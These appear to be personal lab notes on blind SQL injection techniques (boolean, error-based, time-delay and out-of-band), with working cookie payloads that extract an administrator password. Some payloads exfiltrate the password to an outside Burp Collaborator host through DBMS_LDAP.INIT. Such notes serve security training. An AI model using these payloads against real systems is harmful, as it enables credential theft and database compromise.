- Blind meaning HTTP responses don't indicate results of the SQL injection or errors
- So, UNION attacks and such aren't effective (rely on seeing changes in the results)

## Blind with slightly different response

- Basically I used the "Cluster Bomb" attack (2 payloads: one index and one ASCII number code) in Burp Intruder and tested each position index for equality to an ASCII number code and grep'd for "Welcome back!" in the options

![5e84808967ca608e8b6db4f75d358222.png](../../_resources/5e84808967ca608e8b6db4f75d358222-1.png)

Injection: 
```txt
TrackingId=xAiWPEZbmYgdUVoz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),3,1)) = 121--
```

Testing length of password: 
```txt
TrackingId=xAiWPEZbmYgdUVoz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Result (ASCII codes): 
54, 55, 121, 116, 52, 100, 114, 106, 114, 53, 100, 118, 108
105, 101, 109, 112, 48, 51, 101

Result (ASCII): 
67yt4drjr5dvliemp03e

## Blind with conditional errors
- Works when errors are not handled properly

![b7f8713e42df56a10b73e2c1a2d76ac0.png](../../_resources/b7f8713e42df56a10b73e2c1a2d76ac0-1.png)

Example: 
```txt
TrackingId=xAiWPEZbmYgdUVoz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Can enumerate a little, since the following doesn't return an error (probably Oracle):
```txt
TrackingId=KkPYkGrs2RikZpR1' UNION SELECT version FROM v$instance--;
```

Figuring out password length (error means TRUE):
```txt
TrackingId=xyz'||(SELECT CASE WHEN (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a' THEN to_char(1/0) ELSE null END FROM dual)||'
```

Figuring out password iteratively with Burp Intruder

![7b17c7d48bca80afedb2ec833ee3f49a.png](../../_resources/7b17c7d48bca80afedb2ec833ee3f49a-1.png)

![9b80e3f4737f4953ec6463cde61f5490.png](../../_resources/9b80e3f4737f4953ec6463cde61f5490-1.png)

![bd730c94fb921d53131d9dd850fbc7d7.png](../../_resources/bd730c94fb921d53131d9dd850fbc7d7-1.png)

![0662da1a36ed788756a406ad06ab05a6.png](../../_resources/0662da1a36ed788756a406ad06ab05a6-1.png)

Result: 

![343b7a62016ae603dda6b39975c38546.png](../../_resources/343b7a62016ae603dda6b39975c38546-1.png)

Result (ASCII codes): 
49, 51, 98, 57, 101, 52, 51, 101, 54, 52, 116, 52, 112, 104, 53, 100, 111, 100, 48, 114

Result (ASCII): 
13b9e43e64t4ph5dod0r

## Blind with time delays
- Works even when errors ARE handled properly

![82ae318927eef7b8c1abb5b1c6744e0a.png](../../_resources/82ae318927eef7b8c1abb5b1c6744e0a-1.png)

Example:
```txt
TrackingId=xyz'||pg_sleep(10)--
```

## Blind with time delays and information retrieval

![1f7d1fb63a8b93a49e43bce36ebe35ba.png](../../_resources/1f7d1fb63a8b93a49e43bce36ebe35ba-1.png)

```txt
TrackingId=xyz'||CASE WHEN (SELECT 'a' FROM users WHERE username='administrator' AND ASCII(SUBSTRING(password,1,1))>0 )='a' THEN pg_sleep(2) ELSE pg_sleep(0) END--
```

Result (ASCII codes): 
105, 55, 54, 102, 48, 104, 56, 100, 121, 57, 101, 116, 49, 49, 55, 108, 49, 49, 50, 106

Result (ASCII):
i76f0h8dy9et117l112j

## Blind with out-of-band interaction 

![ca386e70c43b253c95bcd4c412936b92.png](../../_resources/ca386e70c43b253c95bcd4c412936b92-1.png)

![ad669c15cf5e13f10ff7c4d82ba88399.png](../../_resources/ad669c15cf5e13f10ff7c4d82ba88399-1.png)

```txt
TrackingId='||DBMS_LDAP.INIT('f5l0z7zlhqbkr0pc9m9jwhsq5hb9zy.burpcollaborator.net',80)--
```

## Blind with out-of-band data exfiltration

(See above for more payloads)

![59ef648905d59f1cde9ef605e451014d.png](../../_resources/59ef648905d59f1cde9ef605e451014d-1.png)

```txt
TrackingId='||DBMS_LDAP.INIT((SELECT password FROM users WHERE username='administrator')||'777'||'f5l0z7zlhqbkr0pc9m9jwhsq5hb9zy.burpcollaborator.net',80)--
```

![9f0b22957219a7901fc6b91edb2338f2.png](../../_resources/9f0b22957219a7901fc6b91edb2338f2-1.png)

Result: 
z23ruu54p32hen70w4yb